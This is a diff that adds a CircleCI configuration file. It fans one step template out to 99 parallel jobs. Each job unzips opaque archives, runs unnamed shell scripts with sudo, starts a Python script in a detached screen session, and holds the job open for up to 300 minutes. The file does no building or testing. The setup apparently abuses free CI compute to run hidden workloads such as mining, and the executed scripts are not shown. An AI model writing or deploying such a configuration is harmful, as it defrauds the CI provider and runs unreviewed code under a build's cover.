@@ -1,0 +1,568 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s
+          unzip vegas.zip && chmod u+x *
+          #./vegas.sh####
+    - run:
+        name: C
+        command: |
+          unzip ohio.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./A.sh
+    - run:
+        name: F
+        command: |
+          sudo ./B.sh
+    - run:
+        name: G
+        command: |
+          sudo ./C.sh
+    - run:
+        name: H
+        command: |
+          sudo ./D.sh
+    - run:
+        name: I
+        command: |
+          sudo ./E.sh
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Legend Begin Om. . ."
+          sudo ./G.sh
+          sudo ./H.sh
+          sudo ./I.sh
+          screen -dmS Acdb python3 pro.py
+          sleep 300s
+          ./main.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  Aeo_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Aeo_02:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_03:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_04:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_05:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_06:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_07:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_08:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_09:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_11:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_12:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_13:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_14:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_15:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_16:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_17:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_18:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_19:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_21:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_22:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_23:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_24:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_25:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_26:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_27:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_28:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_29:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_31:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_32:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_33:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_34:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_35:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_36:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_37:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_38:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_39:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_41:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_42:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_43:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_44:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_45:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_46:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_47:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_48:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_49:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_51:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_52:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_53:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_54:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_55:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_56:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_57:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_58:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_59:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_61:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_62:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_63:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_64:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_65:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_66:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_67:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_68:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_69:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_71:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_72:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_73:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_74:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_75:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_76:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_77:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_78:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_79:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_81:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_82:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_83:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_84:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_85:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_86:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_87:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_88:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_89:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  Aeo_92:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_93:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  Aeo_94:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_95:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_96:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_97:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_98:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  Aeo_99:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+
+
+workflows:
+  version: 2
+  DataAeo:
+    jobs:
+      - Aeo_01
+      - Aeo_02
+      - Aeo_03
+      - Aeo_04
+      - Aeo_05
+      - Aeo_06
+      - Aeo_07
+      - Aeo_08
+      - Aeo_09
+      - Aeo_10
+      - Aeo_11
+      - Aeo_12
+      - Aeo_13
+      - Aeo_14
+      - Aeo_15
+      - Aeo_16
+      - Aeo_17
+      - Aeo_18
+      - Aeo_19
+      - Aeo_20
+      - Aeo_21
+      - Aeo_22
+      - Aeo_23
+      - Aeo_24
+      - Aeo_25
+      - Aeo_26
+      - Aeo_27
+      - Aeo_28
+      - Aeo_29
+      - Aeo_30
+      - Aeo_31
+      - Aeo_32
+      - Aeo_33
+      - Aeo_34
+      - Aeo_35
+      - Aeo_36
+      - Aeo_37
+      - Aeo_38
+      - Aeo_39
+      - Aeo_40
+      - Aeo_41
+      - Aeo_42
+      - Aeo_43
+      - Aeo_44
+      - Aeo_45
+      - Aeo_46
+      - Aeo_47
+      - Aeo_48
+      - Aeo_49
+      - Aeo_50
+      - Aeo_51
+      - Aeo_52
+      - Aeo_53
+      - Aeo_54
+      - Aeo_55
+      - Aeo_56
+      - Aeo_57
+      - Aeo_58
+      - Aeo_59
+      - Aeo_60
+      - Aeo_61
+      - Aeo_62
+      - Aeo_63
+      - Aeo_64
+      - Aeo_65
+      - Aeo_66
+      - Aeo_67
+      - Aeo_68
+      - Aeo_69
+      - Aeo_70
+      - Aeo_71
+      - Aeo_72
+      - Aeo_73
+      - Aeo_74
+      - Aeo_75
+      - Aeo_76
+      - Aeo_77
+      - Aeo_78
+      - Aeo_79
+      - Aeo_80
+      - Aeo_81
+      - Aeo_82
+      - Aeo_83
+      - Aeo_84
+      - Aeo_85
+      - Aeo_86
+      - Aeo_87
+      - Aeo_88
+      - Aeo_89
+      - Aeo_90
+      - Aeo_91
+      - Aeo_92
+      - Aeo_93
+      - Aeo_94
+      - Aeo_95
+      - Aeo_96
+      - Aeo_97
+      - Aeo_98
+      - Aeo_99
